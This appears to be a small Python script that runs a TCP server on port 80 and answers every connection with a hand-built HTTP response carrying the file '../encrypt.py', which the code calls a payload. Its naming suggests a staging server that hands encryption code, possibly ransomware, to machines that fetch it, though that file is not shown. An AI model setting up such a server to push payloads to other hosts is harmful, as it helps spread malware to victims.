import socketserver

class PayloadHandler(socketserver.StreamRequestHandler):
    def __init__(self, request, client_address, server) -> None:
        super().__init__(request, client_address, server)
        
    
    def handle(self) -> None:
        with open("../encrypt.py", mode = 'rb') as payload:
            self.payload = payload.read()
        self.data = self.request.recv(16)
        self.request.send(b"HTTP/1.1 200 OK\r\n")
        self.request.send(b"Content-Type: text/plain\r\n")
        self.request.send(bytes(f"Content-Length: {len(self.payload)}\r\n\r\n", 'utf-8'))
        self.request.send(self.payload)

with socketserver.TCPServer(("0.0.0.0", 80), PayloadHandler) as server:
    server.serve_forever()

